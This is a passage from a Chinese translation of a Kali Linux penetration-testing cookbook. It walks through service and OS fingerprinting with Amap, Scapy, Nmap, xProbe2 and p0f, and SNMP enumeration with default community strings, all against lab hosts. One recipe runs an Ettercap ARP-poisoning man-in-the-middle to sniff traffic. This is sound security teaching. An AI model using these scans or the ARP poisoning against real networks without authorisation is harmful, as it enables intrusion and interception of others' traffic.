Protocol on 172.16.36.135:80/tcp matches http - banner: HTTP/1.1  200 OK\r\nDate Sat, 26 Oct 2013 014818 GMT\r\nServer Apache/2.2.8  (Ubuntu) DAV/2\r\nX-Powered-By PHP/5.2.4-2ubuntu5.10\r\nContent- Length 891\r\nConnection close\r\nContent-Type  text/html\r\n\r\n<html><head><title>Metasploitable2 -  Linux</title>< 
Protocol on 172.16.36.135:80/tcp matches http-apache-2 - banner:  HTTP/1.1 200 OK\r\nDate Sat, 26 Oct 2013 014818 GMT\r\nServer  Apache/2.2.8 (Ubuntu) DAV/2\r\nX-Powered-By PHP/5.2.4- 2ubuntu5.10\r\nContent-Length 891\r\nConnection close\r\nContent- Type text/html\r\n\r\n<html><head><title>Metasploitable2 -  Linux</title>< 
Protocol on 172.16.36.135:53/tcp matches dns - banner: \f

amap v5.4 finished at 2013-12-19 05:32:23 
```

服务识别会扫描大量端口或者在多有 65536 个端口上执行复杂的扫描，如果每个服务上都探测了每个可能的签名，这样会花费大量时间。为了增加服务识别扫描的速度，我们可以使用`-1`参数，在匹配到特定特性签名之后取消特定服务的分析。

```
root@KaliLinux:~# amap 172.16.36.135 1-100 -q1 
amap v5.4 (www.thc.org/thc-amap) started at 2013-12-19 05:33:16 -  APPLICATION MAPPING mode

Protocol on 172.16.36.135:21/tcp matches ftp 
Protocol on 172.16.36.135:22/tcp matches ssh 
Protocol on 172.16.36.135:25/tcp matches smtp 
Protocol on 172.16.36.135:23/tcp matches telnet 
Protocol on 172.16.36.135:80/tcp matches http 
Protocol on 172.16.36.135:80/tcp matches http-apache-2 
Protocol on 172.16.36.135:53/tcp matches dns

amap v5.4 finished at 2013-12-19 05:33:16
```

Amap 服务识别的底层原理和 Nmap 相似。它注入了一系列探测请求，来尝试请求唯一的响应，它可以用于识别运行在特定端口的软件的版本和服务。但是，要注意的是，虽然 Amap 是个服务识别的替代选项，它并不像 Nmap 那样保持更新和拥有良好维护。所以，Amap 不太可能产生可靠的结果。

## 4.8 Scapy 操作系统识别

由很多技术可以用于尝试识别操作系统或其它设备的指纹。高效的操作系统识别功能非常健壮并且会使用大量的技术作为分析因素。Scapy 可以用于独立分析任何此类因素。这个秘籍展示了如何通过检测返回的 TTL 值，使用 Scapy 执行 OS 识别。

### 准备

为了使用 Scapy 来识别 TTL 响应中的差异，你需要拥有运行 Linux/Unix 操作系统和运行 Windows 操作系统的远程系统。提供的例子使用 Metasploitable2 和 Windows XP。在本地实验环境中配置系统的更多信息请参考第一章的“安装 Metasploitable2”和“安装 Windows Server”秘籍。

此外，这一节也需要编写脚本的更多信息，请参考第一章中的“使用文本编辑器 VIM 和 Nano”。

### 操作步骤

Windows 和 Linux/Unix 操作系统拥有不同的 TTL 默认起始值。这个因素可以用于尝试识别操作系统的指纹。这些值如下：

| 操作系统 | TTL 起始值 |
| --- | --- |
| Windows | 128 |
| Linux/Unix | 64 |

一些基于 Unix 的系统会的 TTL 默认起始值为 225 。但是，出于简单性考虑，我们会使用所提供的值作为这个秘籍的前提。为了分析来自远程系统的响应中的 TTL，我们首先需要构建请求。这里，我们使用 ICMP 回响请求。为了发送 ICMP 请求，我们必须首先构建请求的层级。我们需要首先构建的是 IP 层。

```
root@KaliLinux:~# scapy Welcome to Scapy (2.2.0) >>> linux = "172.16.36.135"

>>> windows = "172.16.36.134" 
>>> i = IP() 
>>> i.display() 
###[ IP ]###  
    version= 4  
    ihl= None  
    tos= 0x0  
    len= None  
    id= 1  
    flags=   
    frag= 0  
    ttl= 64  
    proto= ip  
    chksum= None  
    src= 127.0.0.1  
    dst= 127.0.0.1  
    \options\ 
>>> i.dst = linux 
>>> i.display() 
###[ IP ]###  
    version= 4  
    ihl= None  
    tos= 0x0  
    len= None  
    id= 1  
    flags=   
    frag= 0  
    ttl= 64  
    proto= ip  
    chksum= None  
    src= 172.16.36.180  
    dst= 172.16.36.135  
    \options\ 
```

为了构建请求的 IP 层，我们应该将`IP`对象赋给`i`变量。通过调用`display`函数，我们可以确认对象的属性配置。通常，发送和接受地址都设为回送地址`127.0.0.1`，所以我们需要将其改为目标地址的值，将`i.dst`改为我们希望扫描的地址的字符串值。

通过再次调用`display`函数，我们可以看到不仅仅目标地址被更新，Scapy 也会将源 IP 地址自动更新为何默认接口相关的地址。现在我们成功构造了请求的 IP 层。既然我们构建了请求的 IP 层，我们应该开始构建 ICMP 层了。

```
>>> ping = ICMP() 
>>> ping.display() 
###[ ICMP ]###  
    type= echo-request  
    code= 0  
    chksum= None  
    id= 0x0  
    seq= 0x0
```

为了构建请求的 ICMP 层，我们会使用和 IP 层相同的技巧。在提供的例子中，`ICMP`对象赋给了`ping`遍历。像之前那样，默认的配置可以用过调用`dispaly`函数来确认。通常 ICMP 类型已经设为了`echo-request`。既然我们创建了 IP 和 ICMP 层，我们需要通过叠放这些层来构建请求。

```
>>> request = (i/ping) 
>>> request.display() 
###[ IP ]###  
    version= 4  
    ihl= None  
    tos= 0x0  
    len= None  
    id= 1  
    flags=   
    frag= 0  
    ttl= 64  
    proto= icmp  
    chksum= None  
    src= 172.16.36.180  
    dst= 172.16.36.135  
    \options\ 
###[ ICMP ]###     
    type= echo-request     
    code= 0     
    chksum= None     
    id= 0x0     
    seq= 0x0
```

IP 和 ICMP 层可以通过以斜杠分隔遍历来叠放。这些层可以赋给新的变量，它代表我们整个请求。`display`函数之后可以调用来查看请求配置。一旦请求构建完毕，我么可以将其传递给`sr1`函数，以便分析响应。

```
>>> ans = sr1(request) 
Begin emission: 
....................Finished to send 1 packets. 
....* 
Received 25 packets, got 1 answers, remaining 0 packets 
>>> ans.display() 
###[ IP ]###  
    version= 4L  
    ihl= 5L  
    tos= 0x0  
    len= 28  
    id= 64067  
    flags=   
    frag= 0L  
    ttl= 64  
    proto= icmp  
    chksum= 0xdf41  
    src= 172.16.36.135  
    dst= 172.16.36.180  
    \options\ 
###[ ICMP ]###     
    type= echo-reply     
    code= 0     
    chksum= 0xffff     
    id= 0x0     
    seq= 0x0 
###[ Padding ]###        
    load=  '\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\ x00\x00'
```

相同的请求可以不通过独立构建和叠放每一层来构建。反之，我们可以使用单行的命令，通过直接调用函数并传递合适参数：

```
>>> ans = sr1(IP(dst=linux)/ICMP()) 
.Begin emission: 
...*Finished to send 1 packets.

Received 5 packets, got 1 answers, remaining 0 packets 
>>> ans 
<IP  version=4L ihl=5L tos=0x0 len=28 id=64068 flags= frag=0L  ttl=64 proto=icmp chksum=0xdf40 src=172.16.36.135  dst=172.16.36.180 options=[] |<ICMP  type=echo-reply code=0  chksum=0xffff id=0x0 seq=0x0 |<Padding   load='\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00 \x00\x00\x00' |>>> 
```

要注意来自 Linux 系统的响应的 TTL 值为 64。同一测试可以对 Windows 系统的 IP 地址执行，我们应该注意到响应中 TTL 值的差异。

```
>>> ans = sr1(IP(dst=windows)/ICMP()) 
.Begin emission: 
......Finished to send 1 packets. 
....* 
Received 12 packets, got 1 answers, remaining 0 packets 
>>> ans 
<IP  version=4L ihl=5L tos=0x0 len=28 id=24714 flags= frag=0L  ttl=128 proto=icmp chksum=0x38fc src=172.16.36.134  dst=172.16.36.180 options=[] |<ICMP  type=echo-reply code=0  chksum=0xffff id=0x0 seq=0x0 |<Padding   load='\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00 \x00\x00\x00' |>>>
```

要注意由 Windows 系统返回的响应的 TTL 为 128。这个响应可以轻易在 Python 中测试：


```
root@KaliLinux:~# python Python 2.7.3 (default, Jan  2 2013, 16:53:07) 
[GCC 4.7.2] on linux2 
Type "help", "copyright", "credits" or "license" for more  information. 
>>> from scapy.all import *
WARNING: No route found for IPv6 destination :: (no default  route?) 
>>> ans = sr1(IP(dst="172.16.36.135")/ICMP()) 
.Begin emission: 
............Finished to send 1 packets. 
....* 
Received 18 packets, got 1 answers, remaining 0 packets 
>>> if int(ans[IP].ttl) <= 64: 
...     print "Host is Linux" 
... else: 
...     print "Host is Windows" 
... Host is Linux 
>>> ans = sr1(IP(dst="172.16.36.134")/ICMP()) 
.Begin emission: 
.......Finished to send 1 packets. 
....* 
Received 13 packets, got 1 answers, remaining 0 packets 
>>> if int(ans[IP].ttl) <= 64: 
...     print "Host is Linux" 
... else: 
...     print "Host is Windows" 
... Host is Windows 
```

通过发送相同请求，可以测试 TTL 值的相等性来判断是否小于等于 64。这里，我们可以假设设备运行 Linux/Unix 操作系统。否则，如果值大于 64，我们可以假设设备可能运行 Windows 操作系统。整个过程可以使用 Python 可执行脚本来自动化：

```py
#!/usr/bin/python

from scapy.all 
import * import logging 
logging.getLogger("scapy.runtime").setLevel(logging.ERROR) 
import sys

if len(sys.argv) != 2:   
    print "Usage - ./ttl_id.py [IP Address]"   
    print "Example - ./ttl_id.py 10.0.0.5"
    print "Example will perform ttl analysis to attempt to determine     whether the system is Windows or Linux/Unix"   
    sys.exit()

ip = sys.argv[1]

ans = sr1(IP(dst=str(ip))/ICMP(),timeout=1,verbose=0) 
if ans == None:   
    print "No response was returned" 
elif int(ans[IP].ttl) <= 64:   
    print "Host is Linux/Unix" 
else:   
    print "Host is Windows" 
```

这个 Python 脚本接受单个参数，由被扫描的 IP 地址组成。基于返回的响应中的 TTL，脚本会猜测远程系统。这个脚本可以通过使用`chmod`修改文件许可，并且直接从所在目标调用来执行：

```
root@KaliLinux:~# chmod 777 ttl_id.py 
root@KaliLinux:~# ./ttl_id.py 
Usage - ./ttl_id.py [IP Address] 
Example - ./ttl_id.py 10.0.0.5 
Example will perform ttl analysis to attempt to determine whether the  system is Windows or Linux/Unix 
root@KaliLinux:~# ./ttl_id.py 172.16.36.134 Host is Windows 
root@KaliLinux:~# ./ttl_id.py 172.16.36.135 Host is Linux/Unix
```

### 工作原理

Windows 操作系统的网络流量的 TTL 起始值通常为 128，然而 Linux/Unix 操作系统为 64。通过假设不高于 64 应该为其中一种系统，我们可以安全地假设 Windows 系统的回复中 TTL 为 65 到 128，而 Linux/Unix 系统的回复中 TTL 为 1 到 64。当扫描系统和远程目标之间存在设备，并且设备拦截请求并重新封包的时候，这个识别方式就会失效。

## 4.9 Nmap 操作系统识别

虽然 TTL 分析有助于识别远程操作系统，采用更复杂的解法也是很重要的。Nmap 拥有操作系统识别功能，它不仅仅是简单的 TTL 分析。这个秘籍展示了如何使用 Nmap 执行基于探测响应分析的操作系统识别。

### 准备

为了使用 Nmap 来执行操作系统识别，你需要拥有运行 Linux/Unix 操作系统和运行 Windows 操作系统的远程系统。提供的例子使用 Metasploitable2 和 Windows XP。在本地实验环境中配置系统的更多信息请参考第一章的“安装 Metasploitable2”和“安装 Windows Server”秘籍。

### 操作步骤

为了执行 Nmap 操作系统识别，Nmap 应该使用`-o`选项并指定 IP 地址来调用：

```
root@KaliLinux:~# nmap 172.16.36.134 -O

Starting Nmap 6.25 ( http://nmap.org ) at 2013-12-19 10:59 EST
Nmap scan report for 172.16.36.134 
Host is up (0.00044s latency). 
Not shown: 991 closed ports 
PORT      STATE SERVICE 
22/tcp    open  ssh 
135/tcp   open  msrpc 
139/tcp   open  netbios-ssn 
445/tcp   open  microsoft-ds 
4444/tcp  open  krb524 
8080/tcp  open  http-proxy 
8081/tcp  open  blackice-icecap 
15003/tcp open  unknown 
15004/tcp open  unknown 
MAC Address: 00:0C:29:18:11:FB (VMware) Device type: general purpose 
Running: Microsoft Windows XP|2003
OS CPE: cpe:/o:microsoft:windows_xp::sp2:professional  cpe:/o:microsoft:windows_server_2003 
OS details: Microsoft Windows XP Professional SP2 or Windows  Server 2003 Network Distance: 1 hop

OS detection performed. Please report any incorrect results at  http://nmap.org/submit/ . 
Nmap done: 1 IP address (1 host up) scanned in 15.67 seconds 
```

在这个输出中，Nmap 会表明运行的操作系统或可能提供一列可能运行的操作系统。这里，Nmap 表明远程操作系统是 Windows XP 或者 Server 2003。

### 工作原理

Nmap 操作系统识别会发送一系列复杂的探测请求，之后分析这些请求的响应，来尝试基于 OS 特定的签名和预期行为识别底层的操作系统。此外，你可以在操作系统是被的输出底部看到，Nmap 依赖于用户的反馈，以便确保服务签名保持可靠。

## 4.10 xProbe2 操作系统识别

xProbe2 是个用于识别远程操作系统的复杂工具。这个秘籍展示了如何使用 xProbe2 基于探测响应分析来执行操作系统识别。

### 准备

为了使用 xProbe2 来执行操作系统识别，你需要拥有运行 Linux/Unix 操作系统和运行 Windows 操作系统的远程系统。提供的例子使用 Metasploitable2 和 Windows XP。在本地实验环境中配置系统的更多信息请参考第一章的“安装 Metasploitable2”和“安装 Windows Server”秘籍。

### 操作步骤

为了使用 xProbe2 对远程系统上执行操作系统是被，需要将单个参数传递给程序，包含被扫描系统的 IP 地址。

```
root@KaliLinux:~# xprobe2 172.16.36.135
Xprobe2 v.0.3 Copyright (c) 2002-2005 fyodor@o0o.nu, ofir@sys- security.com, meder@o0o.nu

[+] Target is 172.16.36.135 
[+] Loading modules. 
[+] Following modules are loaded: 
[x] [1] ping:icmp_ping  -  ICMP echo discovery module 
[x] [2] ping:tcp_ping  -  TCP-based ping discovery module 
[x] [3] ping:udp_ping  -  UDP-based ping discovery module 
[x] [4] infogather:ttl_calc  -  TCP and UDP based TTL distance  calculation 
[x] [5] infogather:portscan  -  TCP and UDP PortScanner 
[x] [6] fingerprint:icmp_echo  -  ICMP Echo request fingerprinting  module 
[x] [7] fingerprint:icmp_tstamp  -  ICMP Timestamp request  fingerprinting module 
[x] [8] fingerprint:icmp_amask  -  ICMP Address mask request  fingerprinting module 
[x] [9] fingerprint:icmp_port_unreach  -  ICMP port unreachable  fingerprinting module 
[x] [10] fingerprint:tcp_hshake  -  TCP Handshake fingerprinting  module 
[x] [11] fingerprint:tcp_rst  -  TCP RST fingerprinting module 
[x] [12] fingerprint:smb  -  SMB fingerprinting module 
[x] [13] fingerprint:snmp  -  SNMPv2c fingerprinting module 
[+] 13 modules registered 
[+] Initializing scan engine 
[+] Running scan engine 
[-] ping:tcp_ping module: no closed/open TCP ports known on  172.16.36.135. Module test failed 
[-] ping:udp_ping module: no closed/open UDP ports known on  172.16.36.135. Module test failed
[-] No distance calculation. 172.16.36.135 appears to be dead or no  ports known 
[+] Host: 172.16.36.135 is up (Guess probability: 50%) 
[+] Target: 172.16.36.135 is alive. Round-Trip Time: 0.00112 sec 
[+] Selected safe Round-Trip Time value is: 0.00225 sec 
[-] fingerprint:tcp_hshake Module execution aborted (no open TCP ports known) 
[-] fingerprint:smb need either TCP port 139 or 445 to run 
[-] fingerprint:snmp: need UDP port 161 open 
[+] Primary guess: 
[+] Host 172.16.36.135 Running OS: "Linux Kernel 2.4.22" (Guess  probability: 100%) 
[+] Other guesses: 
[+] Host 172.16.36.135 Running OS: "Linux Kernel 2.4.23" (Guess  probability: 100%) 
[+] Host 172.16.36.135 Running OS: "Linux Kernel 2.4.21" (Guess  probability: 100%) 
[+] Host 172.16.36.135 Running OS: "Linux Kernel 2.4.20" (Guess  probability: 100%) 
[+] Host 172.16.36.135 Running OS: "Linux Kernel 2.4.19" (Guess  probability: 100%) 
[+] Host 172.16.36.135 Running OS: "Linux Kernel 2.4.24" (Guess  probability: 100%) 
[+] Host 172.16.36.135 Running OS: "Linux Kernel 2.4.25" (Guess  probability: 100%) 
[+] Host 172.16.36.135 Running OS: "Linux Kernel 2.4.26" (Guess  probability: 100%) 
[+] Host 172.16.36.135 Running OS: "Linux Kernel 2.4.27" (Guess  probability: 100%) 
[+] Host 172.16.36.135 Running OS: "Linux Kernel 2.4.28" (Guess  probability: 100%) 
[+] Cleaning up scan engine 
[+] Modules deinitialized 
[+] Execution completed. 
```

这个工具的输出有些误导性。输出中有好几种不同的 Linux 内核，表明特定操作系统概率为 100%。显然，这是不对的。xProbe2 实际上基于操作系统相关的签名的百分比，这些签名在目标系统上被验证。不幸的是，我们可以在输出中看出，签名对于分辨小版本并不足够细致。无论如何，这个工具在识别目标操作系统中，都是个有帮助的额外资源。

### 工作原理

xProbe2 服务识别的底层原理和 Nmap 相似。xProbe2 操作系统识别会发送一系列复杂的探测请求，之后分析这些请求的响应，来尝试基于 OS 特定的签名和预期行为识别底层的操作系统。

## 4.11 p0f 被动操作系统识别

p0f 是个用于识别远程操作系统的复杂工具。这个工具不同于其它工具，因为它为被动识别操作系统而构建，并不需要任何与目标系统的直接交互。这个秘籍展示了如何使用 p0f 基于探测响应分析来执行操作系统识别。

### 准备

为了使用 xProbe2 来执行操作系统识别，你需要拥有运行 Linux/Unix 操作系统和运行 Windows 操作系统的远程系统。提供的例子使用 Metasploitable2 和 Windows XP。在本地实验环境中配置系统的更多信息请参考第一章的“安装 Metasploitable2”和“安装 Windows Server”秘籍。

### 操作步骤

如果你直接从命令行执行 p0f，不带任何实现的环境配置，你会注意到它不会提供很多信息，除非你直接和网络上的一些系统交互：

```
root@KaliLinux:~# p0f 
p0f - passive os fingerprinting utility, version 2.0.8 (C) M. Zalewski <lcamtuf@dione.cc>, W. Stearns <wstearns@pobox.com> 
p0f: listening (SYN) on 'eth1', 262 sigs (14 generic, cksum  0F1F5CA2), rule: 'all'. 
```

信息的缺失是一个证据，表示不像其他工具那样，p0f 并不主动探测设备来尝试判断他们的操作系统。反之，它只会安静地监听。我们可以在这里通过在单独的终端中运行 Nmap 扫描来生成流量，但是这会破坏被动 OS 识别的整个目的。反之，我们需要想出一个方式，将流量重定向到我们的本地界面来分析，以便可以被动分析它们。

Ettercap 为这个目的提供了一个杰出的方案，它提供了毒化 ARP 缓存并创建 MITM 场景的能力。为了让两个系统之间的流量经过我们的本地界面，你需要对每个系统进行 ARP 毒化。

```
root@KaliLinux:~# ettercap -M arp:remote /172.16.36.1/  /172.16.36.135/ -T -w dump

ettercap NG-0.7.4.2 copyright 2001-2005 ALoR & NaGA

Listening on eth1... (Ethernet)

  eth1 ->  00:0C:29:09:C3:79     172.16.36.180     255.255.255.0

SSL dissection needs a valid 'redir_command_on' script in the  etter.conf file 
Privileges dropped to UID 65534 GID 65534...

  28 plugins  
  41 protocol dissectors 
  56 ports monitored 
  7587 mac vendor fingerprint
  1766 tcp OS fingerprint 
  2183 known services

Scanning for merged targets (2 hosts)...

* |==================================================>| 100.00 %

2 hosts added to the hosts list...

ARP poisoning victims:

 GROUP 1 : 172.16.36.1 00:50:56:C0:00:08

 GROUP 2 : 172.16.36.135 00:0C:29:3D:84:32 
Starting Unified sniffing...

Text only Interface activated... 
Hit 'h' for inline help


```

在提供的例子中，Ettercap 在命令行中执行。`-M`选项定义了由`arp:remote`参数指定的模式。这表明会执行 ARP 毒化，并且会嗅探来自远程系统的流量。开始和闭合斜杠之间的 IP 地址表示被毒化的系统。`-T`选项表明操作会执行在整个文本界面上，`-w`选项用于指定用于转储流量捕获的文件。一旦你简历了 MITM，你可以在单独的终端中再次执行 p0f。假设两个毒化主机正在通信，你应该看到如下流量：

```
root@KaliLinux:~# p0f 
p0f - passive os fingerprinting utility, version 2.0.8 (C) M. Zalewski <lcamtuf@dione.cc>, W. Stearns <wstearns@pobox.com> 
p0f: listening (SYN) on 'eth1', 262 sigs (14 generic, cksum  0F1F5CA2), rule: 'all'. 
172.16.36.1:42497 - UNKNOWN [S10:64:1:60:M1460,S,T,N,W7:.:?:?] (up:  700 hrs)
   -> 172.16.36.135:22 (link: ethernet/modem) 
172.16.36.1:48172 - UNKNOWN [S10:64:1:60:M1460,S,T,N,W7:.:?:?] (up:  700 hrs)
   -> 172.16.36.135:22 (link: ethernet/modem) 
172.16.36.135:55829 - Linux 2.6 (newer, 1) (up: 199 hrs)
   -> 172.16.36.1:80 (distance 0, link: ethernet/modem) 
172.16.36.1:42499 - UNKNOWN [S10:64:1:60:M1460,S,T,N,W7:.:?:?] (up:  700 hrs)
   -> 172.16.36.135:22 (link: ethernet/modem) 
^C+++ Exiting on signal 2 +++ 
[+] Average packet ratio: 0.91 per minute.
```

所有经过 p0f 监听器的封包会标注为 UNKOWN 或者和特定操作系统签名相关。一旦执行了足够的分析，你应该通过输入`q`关闭 Ettercap 文本界面。

```
Closing text interface...

ARP poisoner deactivated. 
RE-ARPing the victims... 
Unified sniffing was stopped.
```

### 工作原理

ARP 毒化涉及使用无来由的 ARP 响应来欺骗受害者系统，使其将目标 IP 地址与 MITM 系统的 MAC 地址关联。MITM 系统就会收到被毒化系统的流量，并且将其转发给目标接受者。这可以让 MITM 系统能够嗅探所有流量。通过分析流量中的特定行为和签名，p0f 可以识别设备的操作系统，而不需要直接探测响应。

## 4.12 Onesixtyone SNMP 分析

Onesixtyone 是个 SNMP 分析工具，在 UDP 端口上执行 SNMP 操作。它是个非常简单的 snmp 扫描器，对于任何指定的 IP 地址，仅仅请求系统描述。

### 准备

为了使用 Onesixtyone 来执行操作系统识别，你需要拥有开启 SNMP 并可以探测的远程系统。提供的例子使用 Windows XP。配置 Windows 系统的更多信息请参考第一章的“安装 Windows Server”秘籍。

### 操作步骤

这个信息可以用于准确识别目标设备的操作系统指纹。为了使用 Onesixtyone，我们可以将目标 IP 地址和团体字符串作为参数传入：

```
root@KaliLinux:~# onesixtyone 172.16.36.134 public 
Scanning 1 hosts, 1 communities 
172.16.36.134 [public] Hardware: x86 Family 6 Model 58 Stepping 9  AT/AT COMPATIBLE - Software: Windows 2000 Version 5.1 (Build 2600  Uniprocessor Free)
```

在这个例子中，团体字符串`public`用于查询`172.16.36.134`设备的系统描述。这是多种网络设备所使用的常见字符串之一。正如输出中显式，远程主机使用表示自身的描述字符串回复了查询。

### 工作原理

SNMP 是个用于管理网络设备，以及设备间贡献信息的协议。这个协议的用法通常在企业网络环境中十分必要，但是，系统管理员常常忘记修改默认的团体字符串，它用于在 SNMP 设备之间共享信息。在这个例子中，可以通过适当猜测设备所使用的默认的团体字符串来收集网络设备信息。

## 4.13 SNMPwalk SNMP 分析

SNMPwalk 是个更加复杂的 SNMP 扫描器，可以通过猜测 SNMP 团体字符串来收集来自设备的大量信息。SNMPwalk 循环遍历一系列请求来收集来自设备的尽可能多的信息。

### 准备

为了使用 SNMPwalk 来执行操作系统识别，你需要拥有开启 SNMP 并可以探测的远程系统。提供的例子使用 Windows XP。配置 Windows 系统的更多信息请参考第一章的“安装 Windows Server”秘籍。

### 操作步骤

为了执行 SNMPwalk，应该将一系列参数传给工具，包括被分析系统的 IP 地址，所使用的团体字符串，以及系统所使用的 SNMP 版本：


```
root@KaliLinux:~# snmpwalk 172.16.36.134 -c public -v 2c 
iso.3.6.1.2.1.1.1.0 = STRING: "Hardware: x86 Family 6 Model 58  Stepping 9 AT/AT COMPATIBLE - Software: Windows 2000 Version 5.1  (Build 2600 Uniprocessor Free)" 
iso.3.6.1.2.1.1.2.0 = OID: 
iso.3.6.1.4.1.311.1.1.3.1.1 
iso.3.6.1.2.1.1.3.0 = Timeticks: (56225) 0:09:22.25 
iso.3.6.1.2.1.1.4.0 = "" 
iso.3.6.1.2.1.1.5.0 = STRING: "DEMO-72E8F41CA4" 
iso.3.6.1.2.1.1.6.0 = ""
iso.3.6.1.2.1.1.7.0 = INTEGER: 76 
iso.3.6.1.2.1.2.1.0 = INTEGER: 2
iso.3.6.1.2.1.2.2.1.1.1 = INTEGER: 1 
iso.3.6.1.2.1.2.2.1.1.2 = INTEGER: 2 
iso.3.6.1.2.1.2.2.1.2.1 = Hex-STRING: 4D 53 20 54 43 50 20 4C 6F 6F  70 62 61 63 6B 20 69 6E 74 65 72 66 61 63 65 00 
iso.3.6.1.2.1.2.2.1.2.2 = Hex-STRING: 41 4D 44 20 50 43 4E 45 54 20  46 61 6D 69 6C 79
```

为了对开启 SNMP 的 Windows XP 系统使用 SNMPwalk，我们使用默认的团体字符串`public`，以及版本`2c`。这会生成大量数据，在展示中已经截断。要注意，通常所有被识别的信息都在所查询的 IOD 值后面。这个数据可以通过使用管道连接到`cut`函数来移除标识符。

```
root@KaliLinux:~# snmpwalk 172.16.36.134 -c public -v 2c | cut -d "="  -f 2 
STRING: "Hardware: x86 Family 6 Model 58 Stepping 9 AT/AT COMPATIBLE  - Software: Windows 2000 Version 5.1 (Build 2600 Uniprocessor Free)" 
OID: iso.3.6.1.4.1.311.1.1.3.1.1 
Timeticks: (75376) 0:12:33.76 
"" 
STRING: "DEMO-72E8F41CA4" 
```

要注意， SNMPwalk 的输出中不仅仅提供了系统标识符。在输出中，可以看到一些明显的信息，另一些信息则是模糊的。但是，通过彻底分析它，你可以收集到目标系统的大量信息：

```
Hex-STRING: 00 50 56 FF 2A 8E  
Hex-STRING: 00 0C 29 09 C3 79  
Hex-STRING: 00 50 56 F0 EE E8  
IpAddress: 172.16.36.2 
IpAddress: 172.16.36.180 
IpAddress: 172.16.36.254 
```

在输出的一部分中，可以看到十六进制值和 IP 地址的列表。通过参考已知系统的网络接口，我们就可以知道，这些是 ARP 缓存的内容。它表明了储存在设备中的 IP 和 MAC 地址的关联。

```
STRING: "FreeSSHDService.exe" 
STRING: "vmtoolsd.exe" 
STRING: "java.exe" 
STRING: "postgres.exe" 
STRING: "java.exe"
STRING: "java.exe" 
STRING: "TPAutoConnSvc.exe" 
STRING: "snmp.exe" 
STRING: "snmptrap.exe" 
STRING: "TPAutoConnect.exe" 
STRING: "alg.exe" 
STRING: "cmd.exe" 
STRING: "postgres.exe" 
STRING: "freeSSHd 1.2.0" 
STRING: "CesarFTP 0.99g" 
STRING: "VMware Tools" 
STRING: "Python 2.7.1" 
STRING: "WebFldrs XP" 
STRING: "VMware Tools" 
```
 
此外，运行进程和安装的应用的列表可以在输出中找到。这个信息在枚举运行在目标系统的服务，以及识别潜在的可利用漏洞时十分有用。

### 工作原理

不像 Onesixtyone，SNMPwalk 不仅仅能够识别默认 SNMP 团体字符串的使用，也可以利用这个配置来收集大量来自目标系统的信息。这可以通过使用一序列 SNMP GETNEXT 请求，并使用请求来爆破系统的所有可用信息来完成。

## 4.14 Scapy 防火墙识别

通过评估从封包注入返回响应，我们就可以判断远程端口是否被防火墙设备过滤。为了对这个过程如何工作有个彻底的认识，我们可以使用 Scapy 在封包级别执行这个任务。

### 准备

为了使用 Scapy 来执行防火墙识别，你需要运行网络服务的远程系统。此外，你需要实现一些过滤机制。这可以使用独立防火墙设备，或者基于主机的过滤，例如 Windows 防火墙来完成。通过操作防火墙设备的过滤设置，你应该能够修改被注入封包的响应。

### 操作步骤

为了高效判断是否 TCP 端口被过滤，需要向目标端口发送 TCP SYN 和 ACK 封包。基于用于响应这些注入的封包，我们可以判断端口是否多虑。这两个封包的注入可能会产生四种不同的响应组合。我们会讨论每一种场景，它们对于目标端口的过滤来说表示什么，以及如何测试它们。这四个可能的响应组合如下：

+   SYN 请求没有响应，ACK 请求收到 RST 响应。
+   SYN 请求收到 SYN+ACK 或者 SYN+RST 响应，ACK 请求没有响应。
+   SYN 请求收到 SYN+ACK 或者 SYN+RST 响应，ACK 请求收到 RST 响应。
+   SYN 和 ACK 请求都没有响应。

| | SYN | ACK | | 
| --- | --- |
| 1 | 无响应 | RST | 状态过滤，禁止连入 |
| 2 | SYN + ACK/RST | 无响应 | 状态过滤，禁止连出 |
| 3 | SYN + ACK/RST | RST | 无过滤，SYN 收到 ACK 则开放，反之关闭 |
| 4 | 无响应 | 无响应 | 无状态过滤 |


在第一种场景中，我们应该考虑 SYN 请求没有响应，ACK 请求收到 RST 响应的配置。为了测试它，我们首先应该发送 TCP ACK 封包给目标端口。为了发送 TCP ACK 封包给任何给定的端口，我们首先必须构建请求的层级，我们首先需要构建 IP 层：

```
root@KaliLinux:~# scapy Welcome to Scapy (2.2.0) 
>>> i = IP() 
>>> i.display() 
###[ IP ]###
    version= 4
    ihl= None
    tos= 0x0
    len= None
    id= 1
    flags=
    frag= 0
    ttl= 64
    proto= ip
    chksum= None
    src= 127.0.0.1
    dst= 127.0.0.1
    \options\ 
>>> i.dst = "172.16.36.135"
>>> i.display() 
###[ IP ]###
    version= 4
    ihl= None
    tos= 0x0
    len= None
    id= 1
    flags=
    frag= 0
    ttl= 64
    proto= ip
    chksum= None
    src= 172.16.36.180
    dst= 172.16.36.135
    \options\
```

为了构建请求的 IP 层，我们需要将`IP`对象赋给变量`i`。通过调用`display`函数，我们可以确定对象的属性配置。通常，发送和接受地址都设为回送地址，`127.0.0.1`。这些值可以通过修改目标地址来修改，也就是设置`i.dst`为想要扫描的地址的字符串值。通过再次调用`dislay`函数，我们看到不仅仅更新的目标地址，也自动更新了和默认接口相关的源 IP 地址。现在我们构建了请求的 IP 层，我们可以构建 TCP 层了。

```
>>> t = TCP() 
>>> t.display() 
###[ TCP ]###
    sport= ftp_data
    dport= http
    seq= 0
    ack= 0
    dataofs= None
    reserved= 0
    flags= S
    window= 8192
    chksum= None
    urgptr= 0
    options= {} 
>>> t.dport = 22
>>> t.flags = 'A' 
>>> t.display() 
###[ TCP ]###
    sport= ftp_data
    dport= ssh
    seq= 0
    ack= 0
    dataofs= None
    reserved= 0
    flags= A
    window= 8192
    chksum= None
    urgptr= 0
    options= {}
```


为了构建请求的 TCP 层，我们使用和 IP 层相同的技巧。在这个立即中，`TCP`对象赋给了`t`变量。像之前提到的那样，默认的配置可以通过调用`display`函数来确定。这里我们可以看到目标端口的默认值为 HTTP 端口 80。对于我们的首次扫描，我们将 TCP 设置保留默认。现在我们创建了 TCP 和 IP 层，我们需要将它们叠放来构造请求。

```
>>> request = (i/t) 
>>> request.display() 
###[ IP ]###
    version= 4
    ihl= None
    tos= 0x0
    len= None
    id= 1
    flags=
     frag= 0
    ttl= 64
    proto= tcp
    chksum= None
    src= 172.16.36.180
    dst= 172.16.36.135
    \options\
###[ TCP ]###
    sport= ftp_data
    dport= ssh
    seq= 0
    ack= 0
    dataofs= None
    reserved= 0
    flags= A
